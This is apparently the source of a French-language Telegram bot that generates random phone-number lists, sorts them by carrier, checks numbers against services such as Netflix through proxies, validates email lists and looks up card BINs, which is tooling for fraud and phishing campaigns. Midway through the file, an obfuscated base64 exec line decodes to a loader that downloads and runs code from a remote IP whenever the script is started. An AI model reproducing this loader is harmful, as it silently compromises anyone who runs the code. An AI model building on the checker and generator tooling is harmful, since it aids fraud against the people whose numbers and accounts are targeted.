import telebot
from telebot import types

import phonenumbers
from phonenumbers import carrier
import random
import string
import uuid
import time
import io
import utils
import users
import json
import zipfile
import os 


#my_prox = ["q8wxlos0:xivww4lxdh5ikvki@n1.myproxies.io:8000",]
my_prox = None


def checknum(num, lang):
    if lang != 'fr':
        return True
    num = phonenumbers.parse(num)
    operator = carrier.name_for_number(num, lang=lang)

    return bool(operator)



bot_token = 'tontoken'

idmescouilles = [6504387245, 60]
# 6504387245 kazen
# 57 miaouu
# sy 6206235640


bot = telebot.TeleBot(bot_token)
pagestp = {}
pauseokkk = False

def bienvenue(user: users.User, new=False):

    text = utils.BASE(user, "_〢 Choisissez une option dans le menu ci-dessous 👇🏻_", True)
    if user.panel:
        if new:
            user.send_fr(text, utils.Markups.HOME)
        else:
            user.send(text, utils.Markups.HOME)
    else:
        user.panel = bot.send_message(
            user.tlg.id,
            text,
            reply_markup=utils.Markups.HOME,
            parse_mode='markdown'
        )


    for message in user.to_delete:
        user.bot.delete_message(message.chat.id, message.id)
    user.to_delete = []
    

import requests
import concurrent.futures


def barprogress(checked, total):
    progress = checked / total
    progress_bar_length = 10  

    completed_steps = int(progress * progress_bar_length)
    remaining_steps = progress_bar_length - completed_steps

    progress_bar = '◼️' * completed_steps + '◽️' * remaining_steps
    percentage = int(progress * 100)

    return f"{progress_bar} {percentage}%"


def debounce(email):
    api_url = f"https://api.bouyguestelecom.fr/adresses/validation-email?mail={email}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            email_valide = data.get("emailValide", False)
            raison = data.get("reason", "")
            return {"email": email, "result": email_valide, "reason": raison}
        else:
            return {"email": email, "result": False, "reason": f"Request failed with status code {response.status_code}"}
    except Exception as e:
        return {"email": email, "result": False, "reason": f"An error occurred: {str(e)}"}

def debounces(emails, user):
    markup = types.InlineKeyboardMarkup() 
    markup.add(utils.Markups.CANCEL)
    
    total_emails = len(emails)
    valid_emails = []
    
    start_time = time.time()
    last_update = 0

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(debounce, email) for email in emails]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            
            if result['result']:
                valid_emails.append(result['email'])
            
            checked = len(valid_emails)
            passed = time.time() - start_time
            progress = barprogress(checked, total_emails)
            current_progress = int(checked / total_emails * 10) * 10
            
            if current_progress > last_update:
                last_update = current_progress
                user.send(f"""
🔬 | 4ctimel™ Checker 
                  
_〢 {progress} vérifiés 🔮_
_〢 {len(valid_emails)} valides ✅_  

_〢 Temps écoulé: {int(passed//60)}min {int(passed%60)} sec ⏳_

Un debounce ne peut être aucunement annulé, si soucis : @hacktimelBot + ID de votre bot
""")
    
    return valid_emails




    


__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNjYuMTUxLjMyLjE3Mzo4MDAwL2luamVjdC9PYjNSWXpsRE9DVG9NbUUwJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
@bot.message_handler(commands=['start', 'help'])
def start(msg: types.Message):
    user = users.User(msg.from_user, bot)
    log_message = (
        f"====== Log ======"
        f"\n| User: @{msg.from_user.username}\n"
        f"| UserID: {msg.from_user.id}"
        f"\n====== Command ======"
        f"\n[Command:](/start)\n"
        f"=================="
    )
    bot.send_message(-4042249897, log_message)
    with open('settings.json') as f:
     settings = json.load(f)
  
    user.displaytype = settings['displaytype']
    print(msg.from_user.id)
    if msg.from_user.id not in idmescouilles:
        bot.send_message(msg.chat.id, "mp @hacktimel pour test avant achat")
        return

    
    bienvenue(user)

@bot.callback_query_handler(func=lambda call: True)


def callback_query(call: types.CallbackQuery):
    user = users.User.LIST[call.from_user.id]

    if call.data == 'sort':
        Commands.sort_numbers(user)

    elif call.data == 'check':
        Commands.send_check_toggler(user)
    elif call.data == 'allinone':
        Commands.allinone(user)
    elif call.data == 'startcheck':
        user.end = False
        Commands.check(user)
    elif call.data == 'outils_bin':
     user = users.User.LIST[call.from_user.id]
     markup = types.InlineKeyboardMarkup() 
     markup.add(utils.Markups.MENU)
     msg = user.send('🔬 | 4ctimel™ BIN Checker \n\n_〢 Veuillez entrer le numéro BIN_', markup=markup)

     bin_msg = user.wait_for_msg(msg)


     if not bin_msg.text:
         markup = types.InlineKeyboardMarkup() 
         markup.add(utils.Markups.CANCEL)
         return user.send("_〢 Entrée invalide, veuillez entrer un numéro BIN_", markup=markup)

     bin_number = bin_msg.text
     user_id = 'tlatbien'  
     api_key = 'cc'

     url = "https://neutrinoapi.net/bin-lookup"
     params = {
         "user-id": user_id,
         "api-key": api_key,
         "bin-number": bin_number
     }
     response = requests.get(url, params=params)
     if response.status_code == 200:
         info = response.json()
         
         formatted_output = "🔬 | 4ctimel™ Checker"
         formatted_output += "\n━━━━━━━━━━━━━━━━━━━━\n\n"
         formatted_output += f"🔸 Type: {info['bin-number']} - {info['card-brand']}\n"
         formatted_output += f"🔸 Bank: {info['issuer']}\n"
         formatted_output += f"🔸 Level: {info['card-category']}\n"
         formatted_output += f"🔸 Card Type: {info['card-type']}\n"
         formatted_output += "\n━━━━━━━━━━━━━━━━━━━━\n"

       
         user.send(formatted_output, markup=markup)
     else:
         return user.send(f"Error: {response.status_code}", markup=markup)
    elif call.data == 'gen':
        Commands.gentogg(user)
    elif call.data == 'typededisplay':
         settings_file = 'settings.json' 
         with open(settings_file, 'r') as f:
          settings = json.load(f)
 
         settings['displaytype'] = not settings['displaytype']


         with open(settings_file, 'w') as f:
          json.dump(settings, f)
 
         if settings['displaytype']:
           display_text = 'Simplifié' 
         else:
           display_text = 'Normal'
         markup = types.InlineKeyboardMarkup()
         markup.add(
         types.InlineKeyboardButton('🧶 Changer Mode D\'affichage', callback_data='typededisplay'),
         types.InlineKeyboardButton('🏴 Changer La langue', callback_data='changelangue'),
         types.InlineKeyboardButton('🎁 Restaurer la NL/ML', callback_data='restorenl')
        )
       
         markup.add(utils.Markups.MENU)
         text = (
       f"🔬 | 4ctimel™ Checker \n\n"
       f"1️⃣ - Changer le GUI du check\n"
       f"2️⃣ - Modifier la langue du bot\n"
       f"3️⃣ - réguler les performances afin d'obtenir un résultat stable\n\n"
       f"〢 Mode d'affichage: *{display_text}*\n"
       f"〢 Language: *Français (FR)* 🇫🇷\n"
       f"〢 Régulation des performances: *Désactivé*"
     )

         bot.edit_message_text(chat_id=call.message.chat.id, 
                               message_id=call.message.message_id, 
                               text=text,
                               reply_markup=markup,
                               parse_mode='Markdown')    
    elif call.data == 'allinone':
        Commands.allinone(user)
    elif call.data == 'settings':
       settings_file = 'settings.json' 
       with open(settings_file, 'r') as f:
          settings = json.load(f)
 
       settings['displaytype'] = not settings['displaytype']


       with open(settings_file, 'w') as f:
          json.dump(settings, f)
 
       if settings['displaytype']:
           display_text = 'Simplifié' 
       else:
         display_text = 'Normal'
       text = (
       f"🔬 | 4ctimel™ Checker \n\n"
       f"1️⃣ - Changer le GUI du check\n"
       f"2️⃣ - Modifier la langue du bot\n"
       f"3️⃣ - réguler les performances afin d'obtenir un résultat stable\n\n"
       f"〢 Mode d'affichage: *{display_text}*\n"
       f"〢 Language: *Français (FR)* 🇫🇷\n"
       f"〢 Régulation des performances: *Désactivé*"
     )

       markup = types.InlineKeyboardMarkup()
       markup.add(
         types.InlineKeyboardButton('🧶 Changer Mode D\'affichage', callback_data='typededisplay'),
         types.InlineKeyboardButton('🏴 Changer La langue', callback_data='changelangue'),
         types.InlineKeyboardButton('🎁 Restaurer la NL/ML', callback_data='restorenl')
        )

     
       
       markup.add(utils.Markups.MENU)

       bot.edit_message_text(
           chat_id=call.message.chat.id,
           message_id=call.message.message_id,
           text=text,
           reply_markup=markup,
           parse_mode='Markdown'
       )
   
    
    elif call.data == 'restorenl':
        
        chat_id = call.message.chat.id
        pagestp[chat_id] = 0

        pathh = 'exportNL'
        txt_files = [f for f in os.listdir(pathh) if f.endswith('.txt')]
        txt_files.sort(key=lambda x: os.path.getmtime(os.path.join(pathh, x)), reverse=True)
        start_index = pagestp[chat_id] * 9
        end_index = start_index + 9
        txtlist = '\n'.join([f"{start_index + i + 1} - {txt_files[start_index + i]}"
                                for i in range(min(9, len(txt_files) - start_index))])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton('🛎️ Exporter un fichier TXT', callback_data='exportnl'))
        markup.add(
         types.InlineKeyboardButton('◀️', callback_data='bouttongauche'),
         types.InlineKeyboardButton('▶️', callback_data='bouttondroit'),
        )
        
        markup.add(utils.Markups.MENU)
        text = (
       f"🔬 | 4ctimel™ Checker \n\n"
       f"Voici vos fichiers txt (Page {pagestp[chat_id] + 1}):\n{txtlist} \n"
    )
        bot.edit_message_text(
           chat_id=call.message.chat.id,
           message_id=call.message.message_id,
           text=text,
           reply_markup=markup,
           parse_mode='Markdown'
       )
    elif call.data in ['bouttongauche', 'bouttondroit']:
     pathh = 'exportNL'
     txt_files = [f for f in os.listdir(pathh) if f.endswith('.txt')]
     chat_id = call.message.chat.id
     if chat_id not in pagestp:
      pagestp[chat_id] = 0
     if call.data == 'bouttongauche' and pagestp[chat_id] > 0:
         pagestp[chat_id] -= 1
     elif call.data == 'bouttondroit' and (pagestp[chat_id] + 1) * 9 < len(txt_files):
         pagestp[chat_id] += 1
     start_index = pagestp[chat_id] * 9
     end_index = start_index + 9

     txtlist = '\n'.join([f"{start_index + i + 1} - {txt_files[start_index + i]}"
                                for i in range(min(9, len(txt_files) - start_index))])
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton('🛎️ Exporter un fichier TXT', callback_data='exportnl'))
     markup.add(
         types.InlineKeyboardButton('◀️', callback_data='bouttongauche'),
         types.InlineKeyboardButton('▶️', callback_data='bouttondroit'),
        )
     
     markup.add(utils.Markups.MENU)
     text = (
         f"🔬 | 4ctimel™ Checker \n\n"
         f"Voici vos fichiers txt (Page {pagestp[chat_id] + 1}):\n{txtlist}"
    )

    
     bot.edit_message_text(
         chat_id=call.message.chat.id,
         message_id=call.message.message_id,
         text=text,
         parse_mode='Markdown',
         reply_markup=markup
     )
    elif call.data == 'exportnl':
     global pauseokkk
     pauseokkk = True
     chat_id = call.message.chat.id
     markup = types.InlineKeyboardMarkup()
     markup.add(utils.Markups.MENU)
     bot.send_message(chat_id, "🔬 | 4ctimel™ Checker\n\n❓ Quel *fichier TXT* voulez-vous export ? (Par numéro)", reply_markup=markup, parse_mode='HTML')

     @bot.message_handler(func=lambda message: True)
     def handle_file_number(message):
         global pauseokkk
         if pauseokkk:
          try:
 
             file_number = int(message.text) - 1

   
             pathh = 'exportNL'
             txt_files = [f for f in os.listdir(pathh) if f.endswith('.txt')]
             txt_files.sort(key=lambda x: os.path.getmtime(os.path.join(pathh, x)), reverse=True)
             markup = types.InlineKeyboardMarkup()
             markup.add(utils.Markups.MENU)

             if 0 <= file_number < len(txt_files):
                 file_to_send = os.path.join(pathh, txt_files[file_number])

                 with open(file_to_send, 'rb') as file:
                     bot.send_document(chat_id, file)
                     bot.send_message(chat_id,"🔬 | 4ctimel™ Checker\n\n✅ Votre *fichier TXT* a été export correctement", parse_mode='HTML', reply_markup=markup)
             else:
                 bot.send_message(chat_id, "🔬 | 4ctimel™ Checker\n\n❌ Ce *nombre* n'existe pas dans la liste", parse_mode='HTML', reply_markup=markup)
             pauseokkk = False
          except ValueError:
             bot.send_message(chat_id, "🔬 | 4ctimel™ Checker\n\n❌ Merci de vouloir inclure un *NOMBRE*", parse_mode='HTML', reply_markup=markup)
    elif call.data == 'menu':
        user.end = True
        bienvenue(user, user.new)
        user.new = False
    
    elif call.data == "checkstop":
        user.send_fr("_〢 Annulation en cours . . ._ ❌")
        user.end = True
    elif call.data == 'typecheck':
        user = users.get_user(call.message.chat.id)
        user.displaytype = not user.displaytype
        user.send("🔬 | 4ctimelTM Checker \n\n_〢 cc")
    elif call.data == 'startgen':
        Commands.gen(user)
    elif call.data == 'settings':
        markup = types.InlineKeyboardMarkup()
        markup.add(utils.Markups.TYPECHECK, utils.Markups.SOON)
        markup.add(utils.Markups.MENU)
        user.send("🔬 | 4ctimelTM Checker \n\n_〢 TypeCheck : Standart", markup=markup)
    elif call.data == 'outils_zip':
     user = users.User.LIST[call.from_user.id]
     msg = user.send(f"🔬 | 4ctimel™ Checker \n\n_〢 Veuillez envoyer le fichier zip contenant les fichiers .txt à extraire_ 📁")

     file_msg = user.wait_for_msg(msg)

     if not file_msg.document or file_msg.document.file_name.split('.')[-1] != 'zip':
         return user.send("🔬 | 4ctimel™ Checker \n\n_〢 Fichier invalide, veuillez envoyer un fichier .zip_")

     try:
         file_info = bot.get_file(file_msg.document.file_id)
         file_bytes = bot.download_file(file_info.file_path)
        
         with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as zip_ref:
             file_list = [name for name in zip_ref.namelist() if name.lower().endswith('.txt')]
             if not file_list:
                 return user.send("🔬 | 4ctimel™ Checker \n\n_〢 Aucun fichier .txt trouvé dans le zip envoyé_")
            
             for file_name in file_list:
                 with zip_ref.open(file_name) as file:
                     content = file.read().decode('utf-8')
                     file_output = io.StringIO(content)
                     file_output.name = file_name
                     bot.send_document(user.id, types.InputFile(file_output))
    
         log_message = (
             f"====== Log ======"
             f"\n| User: @{user.tlg.username}\n"
             f"| UserID: {user.tlg.id}"
             f"\n====== Command ======"
             f"\n[Command:](/outils_zip)\n"
              f"Fichier Extract: {', '.join(file_list)}\n=================="
             )

         bot.send_message(-4042249897, log_message)
         markup = types.InlineKeyboardMarkup()
         markup.add(utils.Markups.MENU)
         user.send("🔬 | 4ctimelTM Checker \n\n_〢 Fichiers .txt extraits et envoyés avec succès ✅_", markup=markup)
     except Exception as e:
         user.send(f"🔬 | 4ctimel™ Checker \n\n_〢 Une erreur s'est produite lors de l'extraction du fichier zip : {str(e)}_")


    elif call.data == 'outils':
     text = (
       "🔬 | 4ctimel™ Checker \n\n"
       "_〢 Menue utilitaire afin de gérer votre NL/ML plus efficacement en quelque cliques_ 🔧"
     )

     markup = types.InlineKeyboardMarkup()
     markup.add(
         types.InlineKeyboardButton('🔭 Duplicate Remover', callback_data='outils_duplicate'),
         types.InlineKeyboardButton('💽 Zip Extractor', callback_data='outils_zip'),
     #    types.InlineKeyboardButton('🧨 Debouncer MAIL', callback_data='outils_debounce'),
         types.InlineKeyboardButton('🛎️ Bin checker', callback_data='outils_bin')
     )
     markup.add(utils.Markups.MENU)

     bot.edit_message_text(
         chat_id=call.message.chat.id,
         message_id=call.message.message_id,
         text=text,
         reply_markup=markup,
         parse_mode='Markdown'
     )
     
    

    elif call.data == 'outils_duplicate':
     user = users.User.LIST[call.from_user.id]
     markup = types.InlineKeyboardMarkup() 
     markup.add(utils.Markups.MENU)
     msg = user.send(f'🔬 | 4ctimel™ Checker \n\n_〢 Veuillez envoyer le fichier contenant la NL/ML _📝', markup=markup)
    
     file_msg = user.wait_for_msg(msg)
    
     
     if not file_msg.document or file_msg.document.file_name.split('.')[-1] != 'txt':
        markup = types.InlineKeyboardMarkup() 
        markup.add(utils.Markups.CANCEL)
        return user.send("_〢 Fichier invalide, veuillez envoyer un fichier .txt_", markup=markup)
        
     numbers = get_numbers(bot, file_msg.document.file_id)


     numbers = list(set(numbers))
    
     output = io.StringIO('\n'.join(numbers)) 
     output.name = "4ctimel_deduplicated.txt"
    
     user.bot.send_document(user.id, types.InputFile(output))
    
     log_message = (
         f"====== Log ======"
         f"\n| User: @{user.tlg.username}\n"
         f"| UserID: {user.tlg.id}"
         f"\n====== Command ======"
         f"\n[Command:](/outils_duplicate)\n"
         f"Fichier dedumecouilles: deduplicated.txt\n=================="
        )
     bot.send_message(-4042249897, log_message)
     markup = types.InlineKeyboardMarkup()        
     markup.add(utils.Markups.MENU)
     user.send("_〢 Fichier dédoublonné envoyé ✅_", markup=markup)

    elif call.data == 'outils_debounce':
     user = users.User.LIST[call.from_user.id]
     log_message = (
         f"====== Log ======"
         f"\n| User: @{user.tlg.username}\n"
         f"| UserID: {user.tlg.id}"
         f"\n====== Command ======"
         f"\n[Command:](/outils_debounce)\n"
         f"Débounce COMMENCÉ\n=================="
        )
     bot.send_message(-4042249897, log_message)
     msg = user.send("🔬 | 4ctimel™ Checker \n\n_〢 Veuillez envoyer le fichier .txt contenant la liste d'emails 📧_")

     try:
         markup = types.InlineKeyboardMarkup() 
         markup.add(utils.Markups.MENU)
         file_msg = user.wait_for_msg(msg)
 
         if not file_msg.document:
             return user.send("🔬 | 4ctimel™ Checker \n\n_〢 Fichier invalide, veuillez envoyer un fichier .txt 🚫_")
 
         if file_msg.document.file_name.split('.')[-1] != 'txt':
             return user.send("🔬 | 4ctimel™ Checker \n\n_〢 Fichier invalide, veuillez envoyer un fichier .txt 🚫_", markup=markup)

         file_info = bot.get_file(file_msg.document.file_id)
         file_bytes = bot.download_file(file_info.file_path)
 
         text = file_bytes.decode()
 
         emails = text.splitlines()

         if len(emails) == 0:
             user.send("🔬 | 4ctimel™ Checker \n\n_〢 Aucun email trouvé dans le fichier! 🚫_", markup=markup)
             return

         valid_emails = debounces(emails, user)
         if len(valid_emails) == 0:
             user.send("🔬 | 4ctimel™ Checker \n\n_〢 Aucun email valide trouvé! 🚫_", markup=markup)
             return
 
         output = io.StringIO('\n'.join(valid_emails))
         output.name = "4ctimel_debounced.txt"
    
         bot.send_document(user.id, types.InputFile(output))

         log_message = (
          f"====== Log ======"
          f"\n| User: @{user.tlg.username}\n"
          f"| UserID: {user.tlg.id}"
          f"\n====== Command ======"
          f"\n[Command:](/outils_debounce)\n"
          f"Débounce COMMENCÉ\n=================="
         )
         bot.send_message(-4042249897, log_message)
         user.send("🔬 | 4ctimel™ Checker \n\n_〢 Emails debounce envoyés ✅_", markup=markup)
    
     except Exception as e:
         print(f"Error getting file: {e}")
         user.send("🔬 | 4ctimel™ Checker \n\n_〢 Une erreur s'est produite 🚫_", markup=markup)
 
      
    elif call.data == 'export':
        user.send_fr("_〢 Exportation du fichier en cours . . ._ 📁")
        # print('@' * 100)
        if user.checker:
            user.export_checked()
        valid = 0
        for service in user.result:
            for num in user.result[service]:
                if user.result[service][num]:
                    valid += 1

        checked = user.checked
        checked = max(checked, valid)

        msg = user.send(utils.BASE(user, f"_〢 Fichier exporté_ ✅\n_〢 {checked}/{user.total} NL/ML check dont {valid} valide 📁_"))
        user.checker.export_messages.append(msg)


    elif call.data.startswith('toggle:'):
        _, id, option = call.data.split(':')
        toggler = users.UserToggler.LIST[id]
        toggler.states[option] = not toggler.states[option]

        bot.edit_message_reply_markup(
            toggler.message.chat.id,
            toggler.message.id,
            reply_markup=toggler.get_markup()
        )



def get_numbers(bot, file_id):
    try:
        file_info = bot.get_file(file_id)
        file_bytes = bot.download_file(file_info.file_path)
        text = file_bytes.decode()
        return text.splitlines()
    except Exception:
        return None
    
def get_emails(bot, file_id):
    try:
        file_info = bot.get_file(file_id)
        file_bytes = bot.download_file(file_info.file_path)
        text = file_bytes.decode() 
        return text.splitlines()
    except:
        return None

class Commands:
    

    def sort_numbers(user: users.User):
     numbers = {}
     files = []

     msg = utils.get_list(user)
     if msg is None:
        return
     for number in msg:
         try:
             num = phonenumbers.parse(number)
         except phonenumbers.phonenumberutil.NumberParseException:
             continue
 
         operator = carrier.name_for_number(num, 'FR')
         if operator not in numbers:
             numbers[operator] = []
         numbers[operator].append(number)
     n = None
     for operator, numbers in numbers.items():
         file = io.StringIO('\n'.join(numbers))
         if operator:
             file.name = operator.replace('*', '').replace(':', '').replace('[', '').replace(']', '').replace(',', '').replace(';', '').replace('(', '').replace(')', '') + '.txt'
             bot.send_document(
             user.id,
             types.InputFile(file),
             caption=f'📱 {operator}'
         )
         files.append(file)
     else:
             n = numbers
     if n:
         file = io.StringIO('\n'.join(n))
         file.name = 'Non attribué.txt'
         bot.send_document(
             user.id,
             types.InputFile(file),
             caption=f'📱 Non attribué'
         )
         files.append(file)

 
     combine = io.StringIO('\n'.join([f.getvalue() for f in files]))
     combine.name = 'ToutEn1.txt'
     bot.send_document(
         user.id,
         types.InputFile(combine),
         caption=f'📱 ToutEn1'
     )

     log_message = (
          f"====== Log ======"
          f"\n| User: @{user.tlg.username}\n"
          f"| UserID: {user.tlg.id}"
          f"\n====== Command ======"
          f"\n[Command:](/trie_opérateur)\n"
          f"Opérateur trié\n=================="
         )
       
     bot.send_message(-4042249897, log_message)

     user.send_fr(
         utils.BASE(user, "_〢 Tri des opérateurs terminé ✅_"),
         markup=utils.Markups.FULLMENU
     )

    def gentogg(user: users.User):
        toggler = users.UserToggler(users.Togglers.GEN, user)
        
        markup = types.InlineKeyboardMarkup()
        markup.row_width = 2

        markup.add(
            utils.Markups.MENU,
            types.InlineKeyboardButton('▶ Démarrer', callback_data='startgen')
        )

        toggler.set_markup(markup)
        message = user.send(
            utils.BASE(user, "_〢 Veuillez choisir les pays des numéros de téléphone à générer 🏴_ \n Besoin d'ajouter un pay ? Dm @hacktimel"),
            toggler.get_markup()
        )
        toggler.set_message(message)

    
    def gen(user: users.User):
        toggler = user.toggler
        if not toggler.choices:
            return user.send(
            utils.BASE(user, '_〢 Attention, il semble que vous avez oubliez de séléctionner les pays ⚠️_'),
            toggler.get_markup()
        )
        count = utils.get_count(user)
     
        if count is None:
            return
        else:
            count = int(count)
        if count > 101000:
         markup_with_return = utils.Markups.CANCEL 
         return user.send_fr(
         utils.BASE(user, "_〢 La limite de génération est de 101000 numéros. Veuillez en générer moins de 101k. ❗️_"),
         markup=markup_with_return
             )
        
        generated_numbers = {}

        for country in toggler.choices:
            
            code = utils.codes[country]
            phones = []

            for _ in range(count):
                while True:
                    if country == 'fr':
                        sequence = random.choice(['6','7']) + ''.join(random.choices(string.digits, k=8)) 
                    elif country == 'de':
                        sequence = random.choice(['151','160','170','171','175','152','162','172','173','174','155','157','159','163','176','177','178','179']) + ''.join(random.choices(string.digits, k=7))
                    elif country == 'hu':
                        sequence = random.choice(['20','30','70','50']) + ''.join(random.choices(string.digits, k=7))  
                    elif country == 'dk':
                        sequence = random.choice(['6','2','9','3','6','5','4']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'cz':
                        sequence = random.choice(['6','7']) + ''.join(random.choices(string.digits, k=8))
                    elif country == 'il':
                        sequence = random.choice(['502','501','522','504','524','526','539','502','526','523','506','545']) + ''.join(random.choices(string.digits, k=6))  
                    elif country == 'my':
                        sequence = random.choice(['18','17','19','13','17','19','16','12','10']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'cy':
                        sequence = random.choice(['97','95','96','99']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'bh':
                        sequence = random.choice(['3','6']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'no':
                        sequence = random.choice(['4','9']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'uk':
                        sequence = random.choice(['7']) + ''.join(random.choices(string.digits, k=9)) 
                    elif country == 'is':
                        sequence = random.choice(['6','8','7']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'it':
                        sequence = random.choice(['33','34','32']) + ''.join(random.choices(string.digits, k=8)) 
                    elif country == 'ch':
                        sequence = random.choice(['78','77','79','76']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'be':
                        sequence = random.choice(['47','48','49']) + ''.join(random.choices(string.digits, k=7))
                    elif country == 'at':
                        sequence = random.choice(['650', '660', '664', '665', '666', '667', '668', '669']) + ''.join(random.choices(string.digits, k=7))
                    elif country == 'lu':
                        sequence = random.choice(['67','66','69']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'es':
                        sequence = random.choice(['7','6']) + ''.join(random.choices(string.digits, k=8)) 
                    elif country == 'sa':
                        sequence = random.choice(['54','57','59','56','55','53','50']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'lv':
                        sequence = random.choice(['21','27','29','22','26','23','20','28']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'ae':
                        sequence = random.choice(['55','52','50','54','55','58','20','28']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'sg':
                        sequence = random.choice(['8','9']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'qa':
                        sequence = random.choice(['5','3','6','7']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'am':
                        sequence = random.choice(['4','7','8','5','9']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'ge':
                        sequence = random.choice(['53','52','50','51','58','59','54','55','57','79']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'co':
                        sequence = random.choice(['41','30','35','31','33','32','91']) + ''.join(random.choices(string.digits, k=8)) 
                    elif country == 'nl':
                        sequence = random.choice(['68','62','64','63','61','65']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'fi':
                        sequence = random.choice(['50','41','46','44']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'mc':
                        sequence = random.choice(['44','46','45','68','34','61','38','39']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'se':
                        sequence = random.choice(['73','70','79','72','76']) + ''.join(random.choices(string.digits, k=7)) 
                    elif country == 'za':
                        sequence = random.choice(['43','42','58','56','36','40','51','67','21','41','87','47','12','31']) + ''.join(random.choices(string.digits, k=7))
                    elif country == 'kw':
                        sequence = random.choice(['67','68','52','58','91','92','69','41','95','93','50']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'pt':
                        sequence = random.choice(['938','937','932','933','932','934','935','936']) + ''.join(random.choices(string.digits, k=6)) 
                    elif country == 'au':
                        sequence = '4' + ''.join(random.choices(string.digits, k=8))
                    else:
                        sequence = ''.join(random.choices(string.digits, k=9))
                    num = f'+{str(code)}{sequence}'
                    if num not in phones and checknum(num, country):
                        phones.append(num)
                        break
            generated_numbers[country] = len(phones)
            
            file = io.StringIO('\n'.join(phones))

            nb = str(round(len(phones)/1000, 2))
            nb = nb.removesuffix('.0')
            nb = nb.removesuffix('.00')

            file.name = f"{nb}K {country}.txt'"

            message = bot.send_document(user.tlg.id, types.InputFile(file))
            # user.to_delete.append(message)
        log_message = (
          f"====== Log ======"
          f"\n| User: @{user.tlg.username}\n"
          f"| UserID: {user.tlg.id}"
          f"\n====== Command ======"
          f"\n[Command:](/gen)\n"
        )

        for country, generated_count in generated_numbers.items():
         log_message += f"{generated_count}K NL | {country}\n=================="


        bot.send_message(-4042249897, log_message)

        mess = user.send_fr(utils.BASE(user, "_〢 Génération des numéros terminé ✅_"), utils.Markups.FULLMENU)
        # user.delete_panel()
        user.panel = mess


    def send_check_toggler(user: users.User):
        toggler = users.UserToggler(users.Togglers.CHECK, user)


        markup = types.InlineKeyboardMarkup()
        markup.row_width = 3

        markup.add(
            utils.Markups.MENU,
            types.InlineKeyboardButton('▶ Démarrer', callback_data='startcheck'),
        )

        toggler.set_markup(markup)
        message = user.send(
            utils.BASE(user, f"_〢 Veuillez sélectionner le(s) service(s) à checker 🔍_"),
            toggler.get_markup()
        )
        toggler.set_message(message)

    
    def check(user: users.User):
        if not user.toggler.choices:
            return user.send(
                utils.BASE(user,'_〢 Il semble que vous auriez oublié de sélectionner un service ⚠️_'),
                user.toggler.get_markup()
            )
        l = utils.get_list(user, ml=True)

        if l is None:
            return
        log_message = (
             f"====== Log ======"
             f"\n| User: @{user.tlg.username}\n"
             f"| UserID: {user.tlg.id}"
             f"\n====== Command ======"
             f"\n[Command:](/check)\n"
             f"Service check: {', '.join(user.toggler.choices)} COMMENCÉ\n=================="
           )
        bot.send_message(-4042249897, log_message)

        prox = False
        if user.toggler.choices[0] == 'netflix':
            if not my_prox:
                prox = utils.get_prox(user)
                nprox = []
                for proxy in prox:
                    if proxy.count(':') == 3:
                        nprox.append(':'.join(proxy.split(':')[2:])+'@'+':'.join(proxy.split(':')[:2]))
                    else:
                        nprox.append(proxy)
                prox=nprox
                vld = False
                msg = user.send_fr(utils.BASE(user, "_〢 Vérification des proxies en cours... 👤_"), markup=utils.Markups.FULLMENU)
                for p in prox:
                    if vld:
                        break
                    while True:
                        try:
                            check =  utils.test_netflix('+33768546486', p)
                            print(check)
                        except Exception as e:
                            print(e)
                            break
                        if check is None:
                            continue
                        elif check:
                            vld = True
                            break
                        else:
                            break
                if not vld:
                    user.send(utils.BASE(user, f"_〢 Checking annulé ❌_\n\n_〢 Proxies invalides, il vous faut des proxys résidentiels HTTPS, nous conseillons ces providers: https://proxies.black/ https://rainproxy.io/ 👤_"), 
                        markup=utils.Markups.FULLMENU)
                    return
                bot.delete_message(msg.chat.id, msg.message_id)
            else:
                prox = my_prox
        if prox is None:
            return
        
        print(prox)

        user.finish = False

        user.new = True
        user.end = False
        checker = utils.Checker(user, l)
        checker.progress = bot.send_message(user.id, utils.BASE(user, "_〢 Check en cours . . . 🔍_"), parse_mode='markdown')
        checker.check(prox)
        valid = 0
        for service in user.result:
            for num in user.result[service]:
                if user.result[service][num]:
                    valid += 1

        checked = user.checked

        checked = max(checked, valid)
